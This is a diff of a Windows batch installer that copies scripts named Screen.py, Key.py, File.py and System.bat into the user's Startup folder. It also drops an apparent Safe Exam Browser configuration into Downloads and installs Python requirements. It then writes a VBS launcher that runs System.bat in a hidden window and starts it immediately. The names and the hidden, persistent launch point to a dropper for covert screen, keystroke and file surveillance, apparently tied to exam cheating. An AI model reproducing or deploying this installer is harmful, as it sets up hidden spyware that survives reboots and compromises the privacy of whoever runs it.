@@ -1,34 +1,39 @@
 @echo off
+setlocal
 
-set "EXE1=dist\API.exe"
-set "EXE2=dist\Crack.exe"
-set "EXE3=dist\SafeGuard.exe"
+:: ====== BASE DIRECTORY ======
+set BASEDIR=%~dp0
 
-set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+:: ====== SOURCE FILES ======
+set FILE1=%BASEDIR%dist\Screen.py
+set FILE2=%BASEDIR%dist\Key.py
+set FILE3=%BASEDIR%dist\File.py
+set FILE4=%BASEDIR%dist\Dodona_Seb_GPT.seb
+set FILE5=%BASEDIR%dist\System.bat
+set REQUIREMENTS=%BASEDIR%dist\requirements.txt
 
-if exist "%EXE1%" copy "%EXE1%" "%STARTUP%" /Y
-if exist "%EXE2%" copy "%EXE2%" "%STARTUP%" /Y
-if exist "%EXE3%" copy "%EXE3%" "%STARTUP%" /Y
+:: ====== DESTINATIONS ======
+set STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
+set DOWNLOADS=%USERPROFILE%\Downloads
 
-if exist "%STARTUP%\%~nx1" start "" "%STARTUP%\%~nx1"
-if exist "%STARTUP%\%~nx2" start "" "%STARTUP%\%~nx2"
-if exist "%STARTUP%\%~nx3" start "" "%STARTUP%\%~nx3"
+copy "%FILE1%" "%STARTUP%" /Y
+copy "%FILE2%" "%STARTUP%" /Y
+copy "%FILE3%" "%STARTUP%" /Y
+copy "%FILE5%" "%STARTUP%" /Y
 
+copy "%FILE4%" "%DOWNLOADS%" /Y
 
-set "OTHERFILE=dist\Dodona_Seb_GPT.seb"
+echo Installing Python requirements...
+python -m pip install -r "%REQUIREMENTS%"
 
-set "DOWNLOADS=%USERPROFILE%\Downloads"
+:: ====== CREATE HIDDEN STARTUP LAUNCHER ======
 
-if exist "%OTHERFILE%" copy "%OTHERFILE%" "%DOWNLOADS%" /Y
+echo Set WshShell = CreateObject("WScript.Shell") > "%STARTUP%\RunSystemHidden.vbs"
+echo WshShell.Run Chr(34^) ^& "%STARTUP%\System.bat" ^& Chr(34^), 0 >> "%STARTUP%\RunSystemHidden.vbs"
+echo Set WshShell = Nothing >> "%STARTUP%\RunSystemHidden.vbs"
 
+:: ====== RUN IT NOW ======
+start "" "%STARTUP%\RunSystemHidden.vbs"
 
-set "REQS=dist\requirements.txt"
-
-if exist "%REQS%" (
-    python -m pip install -r "%REQS%"
-) else (
-    echo requirements.txt not found at %REQS%
-)
-
-echo Done!
+echo Deployment complete.
 pause
